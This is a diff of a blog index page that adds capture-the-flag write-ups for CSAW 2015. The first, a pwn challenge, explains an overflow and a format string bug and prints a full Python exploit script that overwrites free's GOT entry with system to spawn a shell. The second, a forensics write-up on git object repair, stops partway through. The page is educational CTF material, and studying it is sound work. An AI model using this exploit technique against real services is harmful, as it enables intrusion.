@@ -9,9 +9,11 @@
   <meta name="author" content="GeeksSpeak">
 
   
-  <meta name="description" content="DefConCTF 2015 Access-Control Writeup
-Point = 1
-Category = Reverse TL;DR we are given a binary which seems to be a client to access a server. ">
+  <meta name="description" content="CSAW 2015 contacts Writeup
+Point = 250
+Category = Exploitable Hi, we are given a binary contacts, 1
+2
+hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ file &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -80,6 +82,933 @@ Category = Reverse TL;DR we are given a binary which seems to be a client to acc
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/09/21/csaw-2015-pwn250-contacts/">CSAW 2015 - PWN250 - Contacts</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-09-21T17:43:52+04:30'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>5:43 pm</span></time>
+        
+           | <a href="/blog/2015/09/21/csaw-2015-pwn250-contacts/#disqus_thread"
+             data-disqus-identifier="http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><strong>CSAW 2015 contacts Writeup</strong><br/>
+<strong>Point = 250</strong><br/>
+<strong>Category = Exploitable</strong></p>
+
+<p>Hi,</p>
+
+<p>we are given a binary <code>contacts</code>,</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ file contacts
+</span><span class='line'>contacts: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=a2c73697f9555c6be6c57478029e352df1f28cc8, stripped</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The binary seems to be a contact manager, based on my analysis it has a buffer at <code>BSS</code>, and every time we create a contact this structure will be located at the buffer:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>struct contact {
+</span><span class='line'>    char *desc;
+</span><span class='line'>    char *num;
+</span><span class='line'>    char name[64];
+</span><span class='line'>    unsigned int desc_length;
+</span><span class='line'>    int enabled;
+</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>desc</code> is the contacs description and allocates a buffer with buffer size <code>des_length</code>. <code>num</code> is the contact number with size <code>0xb</code>.</p>
+
+<p>So, we are going to find vulnerabilities.</p>
+
+<p>I named <code>0x08048980</code> => <code>editCon</code>, this function edites the contact which you give its name, let&rsquo;s check the decompilation:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>int __cdecl editCon(int a1)
+</span><span class='line'>{
+</span><span class='line'>  int n; // [sp+1Ch] [bp-5Ch]@6
+</span><span class='line'>  int v3; // [sp+20h] [bp-58h]@5
+</span><span class='line'>  int v4; // [sp+24h] [bp-54h]@1
+</span><span class='line'>  int v5; // [sp+28h] [bp-50h]@3
+</span><span class='line'>  char s; // [sp+2Ch] [bp-4Ch]@1
+</span><span class='line'>  int v7; // [sp+6Ch] [bp-Ch]@1
+</span><span class='line'>
+</span><span class='line'>  v7 = *MK_FP(__GS__, 20);
+</span><span class='line'>  v4 = a1;
+</span><span class='line'>  printf("Name to change? ");
+</span><span class='line'>  fgets(&s, 64, stdin);
+</span><span class='line'>  if ( strchr(&s, 10) )
+</span><span class='line'>    *strchr(&s, 10) = 0;
+</span><span class='line'>  v5 = 0;
+</span><span class='line'>  while ( 1 )
+</span><span class='line'>  {
+</span><span class='line'>    if ( v5 &gt; 9 )
+</span><span class='line'>    {
+</span><span class='line'>      puts("Name not found");
+</span><span class='line'>      return *MK_FP(__GS__, 20) ^ v7;
+</span><span class='line'>    }
+</span><span class='line'>    if ( !strcmp(&s, (v4 + 8)) )
+</span><span class='line'>      break;
+</span><span class='line'>    ++v5;
+</span><span class='line'>    v4 += 80;
+</span><span class='line'>  }
+</span><span class='line'>  printf("1.Change name\n2.Change description\n&gt;&gt;&gt; ");
+</span><span class='line'>  __isoc99_scanf("%u%*c", &v3);
+</span><span class='line'>  if ( v3 == 1 )
+</span><span class='line'>  {
+</span><span class='line'>    printf("New name: ");
+</span><span class='line'>    fgets((v4 + 8), n, stdin);
+</span><span class='line'>    if ( strchr((v4 + 8), 10) )
+</span><span class='line'>      *strchr((v4 + 8), 10) = 0;
+</span><span class='line'>  }
+</span><span class='line'>  else if ( v3 == 2 )
+</span><span class='line'>  {
+</span><span class='line'>    free(*v4);
+</span><span class='line'>    printf("Length of description: ");
+</span><span class='line'>    __isoc99_scanf("%u%*c", &n);
+</span><span class='line'>    printf("Description: \n\t");
+</span><span class='line'>    *v4 = malloc(n);
+</span><span class='line'>    fgets(*v4, n, stdin);
+</span><span class='line'>  }
+</span><span class='line'>  else
+</span><span class='line'>  {
+</span><span class='line'>    puts("Bad option");
+</span><span class='line'>  }
+</span><span class='line'>  return *MK_FP(__GS__, 20) ^ v7;
+</span><span class='line'>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you may noticed when i try to edit the name there is no input length check a buffer overflow vulnerability. but there may be a problem since we don&rsquo;t know it&rsquo;s value <code>n</code>.
+this can be fixed by first preparing a description edit, so after entering the function again we have a known size.</p>
+
+<p>and after some diging we can notice there is an another vulnerability,  <code>0x08048bd1</code> => pCon:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>int __cdecl pCon(int a1, int a2, int a3, char *format)
+</span><span class='line'>{
+</span><span class='line'>  printf("\tName: %s\n", a1);
+</span><span class='line'>  printf("\tLength %u\n", a2);
+</span><span class='line'>  printf("\tPhone #: %s\n", a3);
+</span><span class='line'>  printf("\tDescription: ");
+</span><span class='line'>  return printf(format);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here we go, a nice format string vulnerability.</p>
+
+<p>by using these two vulnerabilites we have write-what-where primitive to exploit the binary.</p>
+
+<p>this is my scenario,</p>
+
+<ol>
+<li>create a contact.</li>
+<li>leak a pointer to locate the <code>system</code> symbol using fmt vuln.</li>
+<li>create second contact.</li>
+<li>leak second contact decription heap address to have a stable exploitation using fmt vuln.</li>
+<li>create third contact.</li>
+<li>leak third contact decription heap address to have a stable exploitation using fmt vuln.</li>
+<li>Overflow first contact name into the second and use proper description address which leaked before
+ and overwrite number pointer to heap by <code>free</code> got address.</li>
+<li>Overflow second contact name into the third and use proper description address which leaked before
+ and overwrite number pointer to heap by <code>free+2</code> got address.</li>
+<li>Edit second and third contacts description to <code>%####x%1$hn</code> and proper number to overwrite <code>free</code> to <code>system</code></li>
+<li>Edit first contact description to &lsquo;/bin/sh\x00&rsquo;</li>
+<li>delete first contact and pop a shell.</li>
+</ol>
+
+
+<p>Of course null byte is not our concern since fgets is used in reading procedure.</p>
+
+<p><strong> please notice i used <code>precision</code> task libc version </strong> but you can use libc_database to find a proper one blindly.</p>
+
+<p>I should declare there maybe another or better solution but this let me in ;)</p>
+
+<p>and finally out exploit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>import telnetlib
+</span><span class='line'>import struct
+</span><span class='line'>import socket
+</span><span class='line'>import re
+</span><span class='line'>import time
+</span><span class='line'>from hexdump import hexdump
+</span><span class='line'>import pdb
+</span><span class='line'>
+</span><span class='line'>#system_offset = 0x22a32 # local - ubuntu 15.04 - libc6-2.21-0ubuntu4
+</span><span class='line'>system_offset = 0x2670d # Remote -  ubuntu 14.04.2 - libc6_2.19-0ubuntu6.
+</span><span class='line'>
+</span><span class='line'>def readuntil(f, delim='&gt;&gt;&gt; '):
+</span><span class='line'>    data = ''
+</span><span class='line'>    while not data.endswith(delim):
+</span><span class='line'>        c = f.read(1)
+</span><span class='line'>        assert len(c) &gt; 0
+</span><span class='line'>        data += c
+</span><span class='line'>    #print data
+</span><span class='line'>    return data
+</span><span class='line'>
+</span><span class='line'>def p(v):
+</span><span class='line'>    return struct.pack('&lt;Q', v)
+</span><span class='line'>
+</span><span class='line'>def u(v):
+</span><span class='line'>    return struct.unpack('&lt;Q', v)[0]
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>def create_c(f, n, num, l, desc):
+</span><span class='line'>    print "[+] Create Contact"
+</span><span class='line'>    f.write("1\n")
+</span><span class='line'>    readuntil(f, 'Name: ')
+</span><span class='line'>    f.write(n+"\n")
+</span><span class='line'>    readuntil(f, ' No: ')
+</span><span class='line'>    f.write(num+"\n")
+</span><span class='line'>    readuntil(f, 'of description: ')
+</span><span class='line'>    f.write(str(l)+"\n")
+</span><span class='line'>    readuntil(f, 'Enter description:\n\t\t')
+</span><span class='line'>    f.write(desc+"\n")
+</span><span class='line'>    #print "MM", f.read(1024)
+</span><span class='line'>    readuntil(f)
+</span><span class='line'>    
+</span><span class='line'>
+</span><span class='line'>def edit_con_nameon_desc(f, n, l, v):
+</span><span class='line'>    print "[+] Edit Contact"
+</span><span class='line'>    f.write("3\n")
+</span><span class='line'>    readuntil(f, 'change? ')
+</span><span class='line'>    f.write(n+"\n")
+</span><span class='line'>    readuntil(f)
+</span><span class='line'>    f.write("2\n")
+</span><span class='line'>    readuntil(f, 'description: ')
+</span><span class='line'>    f.write(str(l)+"\n")
+</span><span class='line'>    readuntil(f, 'Description: ')
+</span><span class='line'>    f.write(v+"\n")
+</span><span class='line'>    readuntil(f)
+</span><span class='line'>
+</span><span class='line'>def edit_con_name(f, n, v):
+</span><span class='line'>    print "[+] Edit Contact"
+</span><span class='line'>    f.write("3\n")
+</span><span class='line'>    readuntil(f, 'change? ')
+</span><span class='line'>    f.write(n+"\n")
+</span><span class='line'>    readuntil(f)
+</span><span class='line'>    f.write("1\n")
+</span><span class='line'>    readuntil(f, 'name: ')
+</span><span class='line'>    f.write(v+"\n")
+</span><span class='line'>    readuntil(f)
+</span><span class='line'>
+</span><span class='line'>def print_c(f):
+</span><span class='line'>    print "[+] Print Contact"
+</span><span class='line'>    f.write("4\n")
+</span><span class='line'>    return readuntil(f)
+</span><span class='line'>
+</span><span class='line'>def delete_c(f, n):
+</span><span class='line'>    print "[+] Delete Contact"
+</span><span class='line'>    f.write("2\n")
+</span><span class='line'>    readuntil(f, 'remove? ')
+</span><span class='line'>    f.write(n+"\n")
+</span><span class='line'>
+</span><span class='line'>s = socket.socket()
+</span><span class='line'>
+</span><span class='line'>#s.connect(("54.165.223.128", 2555))
+</span><span class='line'>s.connect(("127.0.0.1", 1337))
+</span><span class='line'>
+</span><span class='line'>f = s.makefile('rw', bufsize=0)
+</span><span class='line'>
+</span><span class='line'>readuntil(f)
+</span><span class='line'>
+</span><span class='line'>raw_input("$")
+</span><span class='line'>
+</span><span class='line'>#pdb.set_trace()
+</span><span class='line'>create_c(f, "AA", "123123", 200, "%31$p\n")
+</span><span class='line'>pr = print_c(f)
+</span><span class='line'>address = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
+</span><span class='line'>print "[+] address = ", hex(address)
+</span><span class='line'>system_offset += address
+</span><span class='line'>print "[+] system address = ", hex(system_offset)
+</span><span class='line'>edit_con_nameon_desc(f, "AA", 200, "/bin/sh\x00")
+</span><span class='line'>create_c(f, "BB", "123123", 200, "%1$p\n")
+</span><span class='line'>pr = print_c(f)
+</span><span class='line'>heap_addr = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
+</span><span class='line'>print "[+] address = ", hex(heap_addr)
+</span><span class='line'>heap_addr += 0x10
+</span><span class='line'>
+</span><span class='line'>edit_con_nameon_desc(f, "BB", 200, "BBB")
+</span><span class='line'>
+</span><span class='line'>create_c(f, "CC", "123123", 200, "%1$p\n")
+</span><span class='line'>pr = print_c(f)
+</span><span class='line'>heap_addr_c = int(re.search(r'\tDescription: 0x(\S+)', pr).group(1), 16)
+</span><span class='line'>print "[+] address = ", hex(heap_addr_c)
+</span><span class='line'>heap_addr_c += 0x10
+</span><span class='line'>
+</span><span class='line'>edit_con_nameon_desc(f, "CC", 200, "CCC")
+</span><span class='line'>
+</span><span class='line'>edit_con_name(f, "AA", "AA\x00"+"A"*61+struct.pack("&lt;I", 0xc8)+struct.pack("&lt;I", 0x1)+struct.pack("&lt;I", heap_addr) + struct.pack("&lt;I", 0x0804b014) + "BB\x00\n")
+</span><span class='line'>
+</span><span class='line'>edit_con_name(f, "BB", "BB\x00"+"B"*61+struct.pack("&lt;I", 0xc8)+struct.pack("&lt;I", 0x1)+struct.pack("&lt;I", heap_addr_c) + struct.pack("&lt;I", 0x0804b016) + "CC\x00\n")
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>edit_con_nameon_desc(f, "BB", 200, "%{}x%1$hn".format(system_offset & 0xffff))
+</span><span class='line'>edit_con_nameon_desc(f, "CC", 200, "%{}x%1$hn".format((system_offset &gt;&gt; 16) & 0xffff))
+</span><span class='line'>print_c(f)
+</span><span class='line'>
+</span><span class='line'>delete_c(f, "AA")
+</span><span class='line'>
+</span><span class='line'>t = telnetlib.Telnet()
+</span><span class='line'>t.sock = s
+</span><span class='line'>t.interact()
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>s.close()
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And running the expl:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>hamidx9@KernelsCallMe:~/ctf/csaw/pwn/100$ python sol.py 
+</span><span class='line'>$
+</span><span class='line'>[+] Create Contact
+</span><span class='line'>[+] Print Contact
+</span><span class='line'>[+] address =  0xf75a9a83
+</span><span class='line'>[+] system address =  0xf75d0190
+</span><span class='line'>[+] Edit Contact
+</span><span class='line'>[+] Create Contact
+</span><span class='line'>[+] Print Contact
+</span><span class='line'>[+] address =  0x9ea10e8
+</span><span class='line'>[+] Edit Contact
+</span><span class='line'>[+] Create Contact
+</span><span class='line'>[+] Print Contact
+</span><span class='line'>[+] address =  0x9ea11c8
+</span><span class='line'>[+] Edit Contact
+</span><span class='line'>[+] Edit Contact
+</span><span class='line'>[+] Edit Contact
+</span><span class='line'>[+] Edit Contact
+</span><span class='line'>[+] Edit Contact
+</span><span class='line'>[+] Print Contact
+</span><span class='line'>[+] Delete Contact
+</span><span class='line'>cat flag
+</span><span class='line'>flag{f0rm47_s7r1ng5_4r3_fun_57uff}
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>@HAMIDx9</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/09/21/csaw-2015-for400-sharpturn/">CSAW 2015 - FOR400 - Sharpturn</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-09-21T17:42:51+04:30'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>5:42 pm</span></time>
+        
+           | <a href="/blog/2015/09/21/csaw-2015-for400-sharpturn/#disqus_thread"
+             data-disqus-identifier="http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-for400-sharpturn/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h1>CSAW 2015 - FOR400 - Sharpturn</h1>
+
+<p>Basic useful feature list:</p>
+
+<ul>
+<li>I think my SATA controller is dying.</li>
+<li>HINT: git fsck -v</li>
+</ul>
+
+
+<p>We had a tar.xz file , after extracting found a git repository.
+We had a good hint :</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>git fsck -v
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and the response :</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Checking HEAD link
+</span><span class='line'>Checking object directory
+</span><span class='line'>Checking directory objects/2b
+</span><span class='line'>Checking directory objects/2e
+</span><span class='line'>Checking directory objects/35
+</span><span class='line'>Checking directory objects/4a
+</span><span class='line'>Checking directory objects/4c
+</span><span class='line'>Checking directory objects/7c
+</span><span class='line'>Checking directory objects/a1
+</span><span class='line'>Checking directory objects/cb
+</span><span class='line'>Checking directory objects/d5
+</span><span class='line'>Checking directory objects/d9
+</span><span class='line'>Checking directory objects/e5
+</span><span class='line'>Checking directory objects/ef
+</span><span class='line'>Checking directory objects/f8
+</span><span class='line'>Checking tree 2bd4c81f7261a60ecded9bae3027a46b9746fa4f
+</span><span class='line'>Checking commit 2e5d553f41522fc9036bacce1398c87c2483c2d5
+</span><span class='line'>error: sha1 mismatch 354ebf392533dce06174f9c8c093036c138935f3
+</span><span class='line'>error: 354ebf392533dce06174f9c8c093036c138935f3: object corrupt or missing
+</span><span class='line'>Checking commit 4a2f335e042db12cc32a684827c5c8f7c97fe60b
+</span><span class='line'>Checking tree 4c0555b27c05dbdf044598a0601e5c8e28319f67
+</span><span class='line'>Checking commit 7c9ba8a38ffe5ce6912c69e7171befc64da12d4c
+</span><span class='line'>Checking tree a1607d81984206648265fbd23a4af5e13b289f83
+</span><span class='line'>Checking tree cb6c9498d7f33305f32522f862bce592ca4becd5
+</span><span class='line'>Checking commit d57aaf773b1a8c8e79b6e515d3f92fc5cb332860
+</span><span class='line'>error: sha1 mismatch d961f81a588fcfd5e57bbea7e17ddae8a5e61333
+</span><span class='line'>error: d961f81a588fcfd5e57bbea7e17ddae8a5e61333: object corrupt or missing
+</span><span class='line'>Checking blob e5e5f63b462ec6012bc69dfa076fa7d92510f22f
+</span><span class='line'>Checking blob efda2f556de36b9e9e1d62417c5f282d8961e2f8
+</span><span class='line'>error: sha1 mismatch f8d0839dd728cb9a723e32058dcc386070d5e3b5
+</span><span class='line'>error: f8d0839dd728cb9a723e32058dcc386070d5e3b5: object corrupt or missing
+</span><span class='line'>Checking connectivity <span class="o">(</span><span class="m">32</span> objects<span class="o">)</span>
+</span><span class='line'>Checking a1607d81984206648265fbd23a4af5e13b289f83
+</span><span class='line'>Checking e5e5f63b462ec6012bc69dfa076fa7d92510f22f
+</span><span class='line'>Checking 4a2f335e042db12cc32a684827c5c8f7c97fe60b
+</span><span class='line'>Checking cb6c9498d7f33305f32522f862bce592ca4becd5
+</span><span class='line'>Checking 4c0555b27c05dbdf044598a0601e5c8e28319f67
+</span><span class='line'>Checking 2bd4c81f7261a60ecded9bae3027a46b9746fa4f
+</span><span class='line'>Checking 2e5d553f41522fc9036bacce1398c87c2483c2d5
+</span><span class='line'>Checking efda2f556de36b9e9e1d62417c5f282d8961e2f8
+</span><span class='line'>Checking 354ebf392533dce06174f9c8c093036c138935f3
+</span><span class='line'>missing blob 354ebf392533dce06174f9c8c093036c138935f3
+</span><span class='line'>Checking d57aaf773b1a8c8e79b6e515d3f92fc5cb332860
+</span><span class='line'>Checking f8d0839dd728cb9a723e32058dcc386070d5e3b5
+</span><span class='line'>missing blob f8d0839dd728cb9a723e32058dcc386070d5e3b5
+</span><span class='line'>Checking d961f81a588fcfd5e57bbea7e17ddae8a5e61333
+</span><span class='line'>missing blob d961f81a588fcfd5e57bbea7e17ddae8a5e61333
+</span><span class='line'>Checking 7c9ba8a38ffe5ce6912c69e7171befc64da12d4c
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can see a missing blobs and SHA1 mismatch . maybe its broken so we need to repair objects hashes .
+but lets search more .</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>git ls-tree -r HEAD
+</span><span class='line'><span class="m">100644</span> blob e5e5f63b462ec6012bc69dfa076fa7d92510f22f   Makefile
+</span><span class='line'><span class="m">100644</span> blob f8d0839dd728cb9a723e32058dcc386070d5e3b5   sharp.cpp
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can see sharp.cpp and Makefile , its good .go on lets check commits log :</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>git log --oneline --raw -c
+</span><span class='line'>
+</span><span class='line'>4a2f335 All <span class="k">done</span> now! Should calculate the flag..assuming everything went okay.
+</span><span class='line'>:000000 <span class="m">100644</span> 0000000... e5e5f63... A  Makefile
+</span><span class='line'>:100644 <span class="m">100644</span> d961f81... f8d0839... M  sharp.cpp
